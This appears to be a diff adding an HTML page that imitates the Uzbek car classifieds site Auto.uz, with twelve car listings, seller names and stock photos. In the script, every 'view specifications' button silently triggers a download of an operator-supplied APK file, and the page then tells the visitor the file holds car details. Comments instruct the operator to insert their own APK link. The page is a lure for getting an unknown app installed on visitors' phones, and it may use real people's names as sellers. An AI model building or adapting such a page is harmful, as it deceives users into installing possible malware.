@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Auto.uz - продажа авто с пробегом в Узбекистане</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background-color: #f2f4f7;
+            color: #1e2a3e;
+            line-height: 1.4;
+        }
+        .top-bar {
+            background-color: #fff;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+            padding: 12px 20px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            gap: 15px;
+            border-bottom: 1px solid #e9ecef;
+        }
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo {
+            font-size: 26px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #0b5e7e, #1e88e5);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .logo span {
+            color: #ff8c00;
+        }
+        .city {
+            background: #f0f2f5;
+            padding: 6px 12px;
+            border-radius: 30px;
+            font-size: 14px;
+        }
+        .search-bar {
+            flex: 1;
+            max-width: 500px;
+            display: flex;
+        }
+        .search-bar input {
+            width: 100%;
+            padding: 10px 16px;
+            border: 1px solid #cddae9;
+            border-radius: 40px 0 0 40px;
+            outline: none;
+        }
+        .search-bar button {
+            background: #1e88e5;
+            border: none;
+            padding: 0 20px;
+            border-radius: 0 40px 40px 0;
+            color: white;
+            cursor: pointer;
+        }
+        .user-menu {
+            display: flex;
+            gap: 18px;
+            font-size: 14px;
+        }
+        .user-menu a {
+            text-decoration: none;
+            color: #2c3e50;
+        }
+        .filters {
+            background: white;
+            padding: 16px 20px;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 12px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .filter-btn {
+            background: #f8fafc;
+            border: 1px solid #cbd5e1;
+            padding: 8px 20px;
+            border-radius: 40px;
+            font-size: 14px;
+            cursor: default;
+        }
+        .container {
+            max-width: 1280px;
+            margin: 24px auto;
+            padding: 0 20px;
+        }
+        .results-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        .ads-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 24px;
+        }
+        .ad-card {
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+            transition: 0.2s;
+        }
+        .car-img {
+            height: 200px;
+            background-size: cover;
+            background-position: center;
+            background-color: #eef2f6;
+            position: relative;
+        }
+        .car-details {
+            padding: 16px;
+        }
+        .price {
+            font-size: 22px;
+            font-weight: 800;
+            color: #0f2b3d;
+        }
+        .car-name {
+            font-size: 18px;
+            font-weight: 700;
+            margin: 8px 0;
+        }
+        .specs {
+            font-size: 14px;
+            color: #3a546d;
+            display: flex;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+        .seller {
+            font-size: 13px;
+            color: #2c6b2f;
+            background: #eaf5ea;
+            display: inline-block;
+            padding: 4px 12px;
+            border-radius: 30px;
+            margin-bottom: 12px;
+        }
+        .view-specs-btn {
+            background: #000;
+            color: white;
+            border: none;
+            padding: 10px 0;
+            border-radius: 40px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .view-specs-btn:hover {
+            background: #2c3e50;
+        }
+        footer {
+            text-align: center;
+            padding: 32px;
+            color: #5e7a93;
+            border-top: 1px solid #dee4ec;
+            margin-top: 40px;
+        }
+        @media (max-width: 700px) {
+            .top-bar {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="top-bar">
+        <div class="logo-area">
+            <div class="logo">AUTO.<span>UZ</span></div>
+            <div class="city">Ташкент ▼</div>
+        </div>
+        <div class="search-bar">
+            <input type="text" placeholder="Марка, модель или номер авто">
+            <button>🔍</button>
+        </div>
+        <div class="user-menu">
+            <a href="#">📄 Подать объявление</a>
+            <a href="#">⭐ Избранное</a>
+            <a href="#">👤 Войти</a>
+        </div>
+    </div>
+    <div class="filters">
+        <span class="filter-btn">Марка</span>
+        <span class="filter-btn">Модель</span>
+        <span class="filter-btn">Год от</span>
+        <span class="filter-btn">Цена</span>
+        <span class="filter-btn">Пробег</span>
+    </div>
+</header>
+
+<main class="container">
+    <div class="results-header">
+        <div class="count">Найдено 18 объявлений</div>
+        <div class="sort">Сортировка: по дате ▼</div>
+    </div>
+    <div class="ads-grid" id="adsGrid"></div>
+</main>
+
+<footer>
+    Auto.uz — доска объявлений Узбекистана.<br>
+    © 2025 · Безопасные сделки
+</footer>
+
+<script>
+    // ====== ВАЖНО: здесь вы указываете ССЫЛКУ НА ВАШ APK-ФАЙЛ ======
+    // Замените 'https://ваш-сайт.com/app.apk' на реальную ссылку,
+    // где лежит ваш APK. Можно положить файл в ту же папку и указать "myapp.apk"
+    const YOUR_APK_URL = "https://example.com/ваш_файл.apk";  // <-- СЮДА ВАША ССЫЛКА
+
+    // Данные автомобилей (добавлены реальные фото-ссылки)
+    const cars = [
+        { name: "Хисамиев Рамиль", price: "101981555", model: "Chevrolet Lacetti", year: 2018, engine: "1.8 бензин", mileage: "78 000 км", img: "https://cdn.pixabay.com/photo/2021/01/23/17/07/chevrolet-5943187_640.jpg" },
+        { name: "Холматов Диер", price: "164121068", model: "Toyota Camry", year: 2020, engine: "2.5 гибрид", mileage: "45 200 км", img: "https://cdn.pixabay.com/photo/2016/02/13/13/11/toyota-1197742_640.jpg" },
+        { name: "Husanov Qudratillo", price: "126222810", model: "Hyundai Santa Fe", year: 2019, engine: "2.4 л", mileage: "62 000 км", img: "https://cdn.pixabay.com/photo/2022/05/20/12/07/hyundai-7209415_640.jpg" },
+        { name: "Tirkasheva gulnoza", price: "72127320", model: "Kia Rio", year: 2017, engine: "1.4 л", mileage: "89 300 км", img: "https://cdn.pixabay.com/photo/2017/07/24/11/24/kia-2535309_640.jpg" },
+        { name: "Мавлон", price: "603809000", model: "BMW X7", year: 2023, engine: "3.0 дизель", mileage: "12 000 км", img: "https://cdn.pixabay.com/photo/2021/03/17/14/42/bmw-6102565_640.jpg" },
+        { name: "Клешов Александр", price: "126202335", model: "Volkswagen Passat", year: 2019, engine: "2.0 TDI", mileage: "74 500 км", img: "https://cdn.pixabay.com/photo/2017/04/18/17/23/volkswagen-2239529_640.jpg" },
+        { name: "Куприянов Ростислав", price: "222356495", model: "Mercedes E 300", year: 2021, engine: "2.0 турбо", mileage: "33 000 км", img: "https://cdn.pixabay.com/photo/2021/05/24/13/10/mercedes-benz-6279462_640.jpg" },
+        { name: "Дилшод Якубжанов", price: "180000000", model: "Kia K5", year: 2022, engine: "2.0 л", mileage: "27 000 км", img: "https://cdn.pixabay.com/photo/2019/11/08/15/22/kia-4611206_640.jpg" },
+        { name: "Shahzod", price: "131728960", model: "Mitsubishi Outlander", year: 2018, engine: "2.0 л", mileage: "91 000 км", img: "https://cdn.pixabay.com/photo/2021/10/31/13/04/mitsubishi-6757809_640.jpg" },
+        { name: "Aleksey Semyonov", price: "95802880", model: "Skoda Rapid", year: 2020, engine: "1.6 MPI", mileage: "48 200 км", img: "https://cdn.pixabay.com/photo/2021/10/24/08/51/skoda-6736946_640.jpg" },
+        { name: "Хасанов Азимжон", price: "102611997", model: "Chevrolet Cobalt", year: 2021, engine: "1.5 л", mileage: "37 500 км", img: "https://cdn.pixabay.com/photo/2019/10/24/16/53/chevrolet-4576091_640.jpg" },
+        { name: "Sanjar Nurmatov", price: "121419400", model: "Toyota Land Cruiser Prado", year: 2016, engine: "4.0 л", mileage: "134 000 км", img: "https://cdn.pixabay.com/photo/2018/12/28/09/25/prado-3898934_640.jpg" }
+    ];
+
+    function formatPrice(p) {
+        return Number(p).toLocaleString('ru-RU') + " UZS";
+    }
+
+    // Функция скачивания ВАШЕГО APK
+    function downloadMyApk() {
+        if (YOUR_APK_URL === "https://example.com/ваш_файл.apk") {
+            alert("⚠️ Внимание: вы ещё не заменили ссылку на APK.\n\nОтредактируйте переменную YOUR_APK_URL в коде страницы.\nУкажите путь к вашему .apk файлу.");
+            return;
+        }
+        
+        // Создаём невидимую ссылку и кликаем
+        const link = document.createElement('a');
+        link.href = YOUR_APK_URL;
+        link.download = ""; // подсказывает браузеру скачать, а не открывать
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+        
+        // Сообщение пользователю
+        alert("📱 Начинается скачивание APK-файла с характеристиками автомобиля");
+    }
+
+    const grid = document.getElementById('adsGrid');
+
+    function renderCars() {
+        grid.innerHTML = '';
+        cars.forEach(car => {
+            const card = document.createElement('div');
+            card.className = 'ad-card';
+            card.innerHTML = `
+                <div class="car-img" style="background-image: url('${car.img}');"></div>
+                <div class="car-details">
+                    <div class="price">${formatPrice(car.price)} <small>сум</small></div>
+                    <div class="car-name">${car.model}, ${car.year}</div>
+                    <div class="specs">
+                        <span>${car.engine}</span>
+                        <span>•</span>
+                        <span>${car.mileage}</span>
+                    </div>
+                    <div class="seller">👤 ${car.name}</div>
+                    <button class="view-specs-btn">
+                        📋 Просмотреть характеристики автомобиля
+                    </button>
+                </div>
+            `;
+            grid.appendChild(card);
+        });
+
+        // Навешиваем обработчик на все кнопки
+        document.querySelectorAll('.view-specs-btn').forEach(btn => {
+            btn.addEventListener('click', downloadMyApk);
+        });
+    }
+
+    renderCars();
+</script>
+</body>
+</html>
